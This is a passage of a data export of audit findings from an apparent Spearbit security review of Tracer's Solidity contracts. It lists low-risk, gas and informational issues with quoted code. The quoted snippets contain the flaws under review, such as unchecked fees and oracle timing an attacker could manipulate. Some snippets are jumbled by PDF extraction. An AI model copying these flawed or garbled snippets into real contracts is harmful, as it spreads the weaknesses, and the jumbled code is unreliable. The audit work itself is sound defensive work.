        "body": "The PoolKeeper contract has a function to change the factory: setFactory(). However, calling this function will make previous pools inaccessible for this PoolKeeper unless the new factory imports the pools from the old factory. The isUpkeepRequiredSinglePool() function calls factory.isValidPool(_pool), and it will fail because the new factory doesnt know about the old pools. As this call is essential for upkeeping, the entire upkeep mechanism will fail. function setFactory(address _factory) external override onlyOwner { factory = IPoolFactory(_factory); ... } function isUpkeepRequiredSinglePool(address _pool) public view override returns (bool) { if (!factory.isValidPool(_pool)) { // might not work if factory is changed return false; } ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ether could be lost when calling commit()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The commit() function sends the supplied ETH to makePaidClaimRequest() only if payForClaim == true. If the caller of commit() accidentally sends ETH when payForClaim == false then the ETH stays in the PoolCommitter contract and is effectively lost. Note: This was also documented in Secureums CARE Tracking function commit(...) external payable override checkInvariantsAfterFunction { ... if (payForClaim) { autoClaim.makePaidClaimRequest{value: msg.value}(msg.sender); } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Race condition if PoolFactory deploy pools before fees are set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The deployPool function of PoolFactory contract can deploy pools before the changeInterval value and minting and burning fees are set. This means that fees would not be subtracted. The exact boundaries for the mintingFee, burningFee and changeInterval values arent clear. In some parts of the code < 1e18 is used, and in other parts <= 1e18. Furthermore, the initialize() function of the PoolCommitter contract doesnt check the value of changeInter- val. The setBurningFee(), setMintingFee() and setChangeInterval() functions of PoolCommitter contract dont check the new values. Finally, two representations of 1e18 are used: 1e18 and PoolSwapLibrary.WAD_PRECISION. contract PoolFactory is IPoolFactory, Ownable { function setMintAndBurnFeeAndChangeInterval(uint256 _mintingFee, uint256 _burningFee,...) ... { ... require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); mintingFee = _mintingFee; burningFee = _burningFee; changeInterval = _changeInterval; ... } function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ,! ... // no check that mintingFee, burningFee, changeInterval are set poolCommitter.initialize(..., mintingFee, burningFee, changeInterval, ...); } } 22 contract PoolCommitter is IPoolCommitter, Initializable { function initialize(... ,uint256 _mintingFee, uint256 _burningFee,... ) ... { ... require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); ... // no check on _changeInterval mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); ... } function setBurningFee(uint256 _burningFee) external override onlyGov { burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); // no check on _burningFee ... } function setMintingFee(uint256 _mintingFee) external override onlyGov { mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); // no check on _mintingFee ... } function setChangeInterval(uint256 _changeInterval) external override onlyGov { changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); // no check on ,! _changeInterval ... } function updateMintingFee(bytes16 longTokenPrice, bytes16 shortTokenPrice) private { ... if (PoolSwapLibrary.compareDecimals(mintingFee, MAX_MINTING_FEE) == 1) { // mintingFee is greater than 1 (100%). // We want to cap this at a theoretical max of 100% mintingFee = MAX_MINTING_FEE; // so mintingFee is allowed to be 1e18 } } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Committer not validated on withdraw claim and multi-paid claim",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "AutoClaim checks that the committer creating the claim request in makePaidClaimRequest and withdrawing the claim request in withdrawUserClaimRequest is a valid committer for the PoolFactory used in theAutoClaim initializer. The same security check should be done in all the other functions where the committer is passed as a function parameter.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Some SMAOracle and AutoClaim state variables can be declared as immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "In the SMAOracle contract, the oracle, periods, observer, scaler and updateInterval state vari- ables are not declared as immutable. In the AutoClaim contract, the poolFactory state variable is not declared as immutable. Since the mentioned variables are only initialized in the contracts constructors, they can be declared as immutable in order to save gas.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use of counters can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "counter and i are both used as counters for the same loop. uint32 counter = 1; uint256 i = 0; ... while (i < upperBound) { ... unchecked { counter += 1; } i++; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "transferOwnership() function is inaccessible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The ERC20_Cloneable contract contains a transferOwnership() function that may only be called by the owner, which is PoolFactory. However PoolFactory doesnt call the function so it is essentially dead code, making the deployment cost unnecessary additional gas. function transferOwnership(address _owner) external onlyOwner { require(_owner != address(0), \"Owner: setting to 0 address\"); owner = _owner; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use cached values when present",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The updateAggregateBalance() function creates a temporary variable id with the value currentIn- Immediately after that, currentIntervalIds[i] is used again. This could be replaced by id to tervalIds[i]. save gas. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; if (currentIntervalIds[i] == 0) { // could use id continue; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_invariantCheckContract stored twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Both the PoolCommitter and LeveragedPool contracts store the value of _invariantCheckContract twice, both in invariantCheckContract and invariantCheck. This is not necessary and costs extra gas. contract PoolCommitter is IPoolCommitter, Initializable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize( ..., address _invariantCheckContract, ... ) external override initializer { ... invariantCheckContract = _invariantCheckContract; invariantCheck = IInvariantCheck(_invariantCheckContract); ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... invariantCheckContract = initialization._invariantCheckContract; invariantCheck = IInvariantCheck(initialization._invariantCheckContract); } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary if/else statement in LeveragedPool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "A boolean variable is used to indicate the type of token to mint. The if/else statement can be avoided by using LONG_INDEX or SHORT_INDEX as the parameter instead of a bool to indicate the use of long or short token. uint256 public constant LONG_INDEX = 0; uint256 public constant SHORT_INDEX = 1; ... function mintTokens(bool isLongToken,...){ if (isLongToken) { IPoolToken(tokens[LONG_INDEX]).mint(...); } else { IPoolToken(tokens[SHORT_INDEX]).mint(...); ...",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Uncached array length used in loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The users array length is used in a for loop condition, therefore the length of the array is evaluated in every loop iteration. Evaluating it once and caching it can save gas. for (uint256 i; i < users.length; i++) { ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary deletion of array elements in a loop is expensive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The unAggregatedCommitments[user] array is deleted after the for loop in updateAggregateBal- ance. Therefore, deleting the array elements one by one with delete unAggregatedCommitments[user][i]; in the loop body costs unnecessary gas.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Zero-value transfers are allowed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Given that claim() can return 0 when the claim isnt valid yet due to updateInterval, the return value should be checked to avoid doing an unnecessary sendValue() call with amount 0. Address.sendValue( payable(msg.sender), claim(user, poolCommitterAddress, poolCommitter, currentUpdateIntervalId) );",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unneeded onlyUnpaused modifier in setQuoteAndPool()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The setQuoteAndPool() function is only callable once, from the factory contract during deployment, due to the onlyFactory modifier. During this call, the contract is always unpaused, therefore the onlyUnpaused modifier is not necessary.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary mapping access in AutoClaim.makePaidClaimRequest()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Resolving mappings consumes more gas than directly accessing the storage struct, therefore its more gas-efficient to use the already de-referenced variable than to resolve the mapping again. function makePaidClaimRequest(address user) external payable override onlyPoolCommitter { ClaimRequest storage request = claimRequests[user][msg.sender]; ... uint256 reward = claimRequests[user][msg.sender].reward; ... claimRequests[user][msg.sender].updateIntervalId = requestUpdateIntervalId; claimRequests[user][msg.sender].reward = msg.value;",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function complexity can be reduced from linear to constant by rewriting loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The add() function of the PriceObserver contract shifts an entire array if the buffer is full, and the SMA() function of the SMAOracle contract sums the values of an array to calculate its average. Both of these functions have O(n) complexity and could be rewritten to have O(1) complexity. This would save gas and possibly increase the buffer size. 31 contract PriceObserver is Ownable, IPriceObserver { ... * @dev If the backing array is full (i.e., `length() == capacity()`, then * it is rotated such that the oldest price observation is deleted function add(int256 x) external override onlyWriter returns (bool) { ... if (full()) { leftRotateWithPad(x); ... } function leftRotateWithPad(int256 x) private { uint256 n = length(); /* linear scan over the [1, n] subsequence */ for (uint256 i = 1; i < n; i++) { observations[i - 1] = observations[i]; } ... } contract SMAOracle is IOracleWrapper { * @dev O(k) complexity due to linear traversal of the final `k` elements of `xs` ... function SMA(int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... /* linear scan over the [n - k, n] subsequence */ for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unused observer state variable in PoolKeeper",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "There is no use for the observer state variable. It is only used in performUpkeepSinglePool in a require statement to check if is set. address public observer; function setPriceObserver(address _observer) external onlyOwner { ... observer = _observer; ... function performUpkeepSinglePool(...) require(observer != address(0), \"Observer not initialized\"); ...",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Usage of temporary variable instead of type casting in PoolKeeper.performUpkeepSinglePool()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The pool temporary variable is used to cast the address to ILeveragedPool. Casting the address directly where the pool variable is used saves gas, as _pool is calldata.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Events and event emissions can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "PoolFactory.deployPool() would result in: Having a single DeployCommitter event to be emitted after setQuoteAndPool() in 1. Having better UX/event tracking and alignment with the current behavior to emit events during the Factory deployment. 2. Removing the QuoteAndPoolChanged event that is emitted only once during the lifetime of the PoolCommitter during PoolFactory.deployPool(). 3. Removing the ChangeIntervalSet emission in PoolCommitter.initialize(). The changeInterval has not really changed, it was initialized. This can be tracked by the DeployCommitter event.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Multi-paid claim rewards should be sent only if nonzero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "In both multiPaidClaimMultiplePoolCommitters() and multiPaidClaimSinglePoolCommitter(), there could be cases where the reward sent back to the claimer is zero. In these scenarios, the reward value should be checked to avoid wasting gas.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary quad arithmetic use where integer arithmetic works",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The ABDKMathQuad library is used to compute a division which is then truncated with toUint(). Semantically this is equivalent to a standard uint division, which is more gas efficient. The same library is also unnecessarily used to compute keepers reward. This can be safely done by using standard uint computation. function appropriateUpdateIntervalId(...) ... uint256 factorDifference = ABDKMathQuad.toUInt(divUInt(frontRunningInterval, updateInterval)); function keeperReward(...) ... int256 wadRewardValue = ABDKMathQuad.toInt( ABDKMathQuad.add( ABDKMathQuad.fromUInt(_keeperGas), ABDKMathQuad.div( ( ABDKMathQuad.div( (ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent)), ABDKMathQuad.fromUInt(100) ) ), FIXED_POINT ) ) ); uint256 decimals = IERC20DecimalsWrapper(ILeveragedPool(_pool).quoteToken()).decimals(); uint256 deWadifiedReward = PoolSwapLibrary.fromWad(uint256(wadRewardValue), decimals);",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Custom errors should be used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "In the latest Solidity versions it is possible to replace the strings used to encode error messages with custom errors, which are more gas efficient. AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: require(poolFactory.isValidPoolCommitter(msg.sender), \"msg.sender not valid require(_poolFactoryAddress != address(0), \"PoolFactory address == 0\"); require(poolFactory.isValidPoolCommitter(poolCommitterAddress), \"Invalid require(users.length == poolCommitterAddresses.length, \"Supplied arrays must be same length\"); ,! ChainlinkOracleWrapper.sol: require(_oracle != address(0), \"Oracle cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_deployer != address(0), \"Deployer cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_decimals <= MAX_DECIMALS, \"COA: too many decimals\"); ChainlinkOracleWrapper.sol: require(answeredInRound >= roundID, \"COA: Stale answer\"); ChainlinkOracleWrapper.sol: require(timeStamp != 0, \"COA: Round incomplete\"); ERC20_Cloneable.sol: ERC20_Cloneable.sol: InvariantCheck.sol: InvariantCheck.sol: LeveragedPool.sol: require(msg.sender == owner, \"msg.sender not owner\"); require(_owner != address(0), \"Owner: setting to 0 address\"); require(_factory != address(0), \"Factory address cannot be null\"); require(poolFactory.isValidPool(poolToCheck), \"Pool is invalid\"); require(!paused, \"Pool is paused\"); 36 LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == keeper, \"msg.sender not keeper\"); require(msg.sender == invariantCheckContract, \"msg.sender not invariantCheckContract\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: cannot be 0 address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: require(msg.sender == poolCommitter, \"msg.sender not poolCommitter\"); require(msg.sender == governance, \"msg.sender not governance\"); require(initialization._feeAddress != address(0), \"Fee address cannot be 0 require(initialization._quoteToken != address(0), \"Quote token cannot be 0 require(initialization._oracleWrapper != address(0), \"Oracle wrapper cannot require(initialization._settlementEthOracle != address(0), \"Keeper oracle require(initialization._owner != address(0), \"Owner cannot be 0 address\"); require(initialization._keeper != address(0), \"Keeper cannot be 0 address\"); require(initialization._longToken != address(0), \"Long token cannot be 0 require(initialization._shortToken != address(0), \"Short token cannot be 0 require(initialization._poolCommitter != address(0), \"PoolCommitter cannot require(initialization._invariantCheckContract != address(0), \"InvariantCheck cannot be 0 address\"); require(initialization._fee < PoolSwapLibrary.WAD_PRECISION, \"Fee >= 100%\"); require(initialization._secondaryFeeSplitPercent <= 100, \"Secondary fee split cannot exceed 100%\"); as old governance address\"); ,! LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: invariantCheckContract\"); require(initialization._updateInterval != 0, \"Update interval cannot be 0\"); require(intervalPassed(), \"Update interval hasn't passed\"); require(account != address(0), \"Account cannot be 0 address\"); require(msg.sender == _oldSecondaryFeeAddress); require(_keeper != address(0), \"Keeper address cannot be 0 address\"); require(_governance != governance, \"New governance address cannot be same require(_governance != address(0), \"Governance address cannot be 0 require(governanceTransferInProgress, \"No governance change active\"); require(msg.sender == _provisionalGovernance, \"Not provisional governor\"); require(paused, \"Pool is live\"); require(!paused, \"Pool is paused\"); require(msg.sender == governance, \"msg.sender not governance\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == invariantCheckContract, \"msg.sender not require(msg.sender == factory, \"Committer: not factory\"); require(msg.sender == leveragedPool, \"msg.sender not leveragedPool\"); require(msg.sender == user || msg.sender == address(autoClaim), \"msg.sender not committer or AutoClaim\"); require(_factory != address(0), \"Factory address cannot be 0 address\"); require(_invariantCheckContract != address(0), \"InvariantCheck address cannot be 0 address\"); ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: require(_autoClaim != address(0), \"AutoClaim address cannot be null\"); require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); require(userCommit.balanceLongBurnAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnAmount <= balance.shortTokens, ,! \"Insufficient pool tokens\"); 37 ,! PoolCommitter.sol: PoolCommitter.sol: address\"); ,! PoolCommitter.sol: address\"); ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PriceObserver.sol: PriceObserver.sol: PriceObserver.sol: SMAOracle.sol: ,! SMAOracle.sol: PoolCommitter.sol: require(userCommit.balanceLongBurnMintAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnMintAmount <= balance.shortTokens, \"Insufficient pool tokens\"); require(amount > 0, \"Amount must not be zero\"); require(_quoteToken != address(0), \"Quote token address cannot be 0 require(_leveragedPool != address(0), \"Leveraged pool address cannot be 0 require(_feeReceiver != address(0), \"Address cannot be null\"); require(_poolKeeper != address(0), \"PoolKeeper not set\"); require(autoClaim != address(0), \"AutoClaim not set\"); require(invariantCheck != address(0), \"InvariantCheck not set\"); require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender,\"Deployer must be oracle wrapper owner\"); require(deploymentParameters.leverageAmount >= 1 && deploymentParameters.leverageAmount <= maxLeverage,\"PoolKeeper: leveraged amount invalid\"); require(IERC20DecimalsWrapper(deploymentParameters.quoteToken).decimals() <= MAX_DECIMALS,\"Decimal precision too high\"); require(_poolKeeper != address(0), \"address cannot be null\"); require(_invariantCheck != address(0), \"address cannot be null\"); require(_autoClaim != address(0), \"address cannot be null\"); require(newMaxLeverage > 0, \"Maximum leverage must be non-zero\"); require(_feeReceiver != address(0), \"address cannot be null\"); require(newFeePercent <= 100, \"Secondary fee split cannot exceed 100%\"); require(_fee <= 0.1e18, \"Fee cannot be > 10%\"); require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); require(msg.sender == address(factory), \"Caller not factory\"); require(_factory != address(0), \"Factory cannot be 0 address\"); require(_observer != address(0), \"Price observer cannot be 0 address\"); require(firstPrice > 0, \"First price is non-positive\"); require(observer != address(0), \"Observer not initialized\"); require(timestamp >= lastPriceTimestamp, \"timestamp in the past\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(msg.sender == writer, \"PO: Permission denied\"); require(i < length(), \"PO: Out of bounds\"); require(_writer != address(0), \"PO: Null address not allowed\"); require(_spotOracle != address(0) && _observer != address(0) && _deployer require(_periods > 0 && _periods <= IPriceObserver(_observer).capacity(), require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); require(_updateInterval != 0, \"Update interval cannot be 0\"); require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of != address(0),\"SMA: Null address forbidden\"); \"SMA: Out of bounds\"); ,! SMAOracle.sol: SMAOracle.sol: SMAOracle.sol: update\"); ,! SMAOracle.sol: ,! bounds\");",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Different updateIntervals in SMAOracle and pools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The updateIntervals for the pools and the SMAOracles are different. If the updateInterval for SMAOracle is larger than the updateInterval for poolUpkeep(), then the oracle price update could happen directly after the poolUpkeep(). It is possible to perform permissionless calls to poll(). In combination with a delayed poolUpkeep() an attacker could manipulate the timing of the SMAOracle price, because after a call to poll() it cant be called again until updateInterval has passed. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... updateInterval = initialization._updateInterval; ... } function poolUpkeep(... ) external override onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); ... } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } contract SMAOracle is IOracleWrapper { constructor(..., uint256 _updateInterval, ... ) { updateInterval = _updateInterval; } function poll() external override returns (int256) { require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to update\"); return update(); } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Tight coupling between LeveragedPool and PoolCommitter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The LeveragedPool and PoolCommitter contracts call each other back and forth. This could be optimized to make the code clearer and perhaps save some gas. Here is an example: contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function poolUpkeep(...) external override onlyKeeper { ... IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); ... } } contract PoolCommitter is IPoolCommitter, Initializable { function executeCommitments(...) external override onlyPool { ... uint256 lastPriceTimestamp = pool.lastPriceTimestamp(); uint256 updateInterval = pool.updateInterval(); ... } } // call to first contract // call to first contract",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code in SMA() is hard to read",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The SMA() function checks for k being smaller or equal to uint256(type(int256).max), a value somewhat difficult to read. Additionally, the number 24 is hardcoded. Note: This issue was also mentioned in Runtime Verification report: B15 PriceObserver - avoid magic values function SMA( int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of bounds\"); ... for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code is chain-dependant due to fixed block time and no support for EIP-1559",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The PoolKeeper contract has several hardcoded assumptions about the chain on which it will be deployed. It has no support for EIP-1559 and doesnt use block.basefee. On Ethereum Mainnet the blocktime will change to 12 seconds with the ETH2 merge. The Secureum CARE-X report also has an entire discussion about other chains. contract PoolKeeper is IPoolKeeper, Ownable { ... uint256 public constant BLOCK_TIME = 13; /* in seconds */ ... /// Captures fixed gas overhead for performing upkeep that's unreachable /// by `gasleft()` due to our approach to error handling in that code uint256 public constant FIXED_GAS_OVERHEAD = 80195; ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "ABDKQuad-related constants defined outside PoolSwapLibrary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Some ABDKQuad-related constants are defined outside of the PoolSwapLibrary while others are shadowing the ones defined inside the library. As all ABDKQuad-related logic is contained in the library its less error prone to have any ABDKQuad-related definitions in the same file. The constant one is lowercase, while usually constants are uppercase. contract PoolCommitter is IPoolCommitter, Initializable { bytes16 public constant one = 0x3fff0000000000000000000000000000; ... // Set max minting fee to 100%. This is a ABDKQuad representation of 1 * 10 ** 18 bytes16 public constant MAX_MINTING_FEE = 0x403abc16d674ec800000000000000000; } library PoolSwapLibrary { /// ABDKMathQuad-formatted representation of the number one bytes16 public constant one = 0x3fff0000000000000000000000000000; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lack of a state to allow withdrawal of tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Immediately after the invariants dont hold and the pool has been paused, Governance can withdraw the collateral (quote). It might be prudent to create a separate state besides paused, such that unpause actions cant happen anymore to indicate withdrawal intention. Note: the comment in withdrawQuote() is incorrect. Pool must be paused. /** ... * @dev Pool must not be paused // comment not accurate ... */ ... function withdrawQuote() external onlyGov { require(paused, \"Pool is live\"); IERC20 quoteERC = IERC20(quoteToken); uint256 balance = quoteERC.balanceOf(address(this)); IERC20(quoteToken).safeTransfer(msg.sender, balance); emit QuoteWithdrawn(msg.sender, balance); }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Undocumented frontrunning protection",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "PoolFactory deployPool() per(deploymentParameters.oracleWrapper).deployer() == msg.sender frontrunning the deployment transaction of the pool. function the In of contract, check the protects IOracleWrap- against This is because the poolCommitter, LeveragedPool and the pair tokens instances are deployed at a deterministic address, calculated from the values of leverageAmount, quoteToken and oracleWrapper. An attacker cannot frontrun the pool deployment because of the different msg.sender address, that causes the deployer() check to fail. Alternatively, the attacker will have a different oracleWrapper, resulting in a different pool. However, this is not obvious to a casual reader. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require( IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\" ); ... bytes32 uniquePoolHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper ) ); PoolCommitter poolCommitter = PoolCommitter( Clones.cloneDeterministic(poolCommitterBaseAddress, uniquePoolHash) ); ... LeveragedPool pool = LeveragedPool(Clones.cloneDeterministic(poolBaseAddress, uniquePoolHash)); ... } function deployPairToken(... ) internal returns (address) { ... bytes32 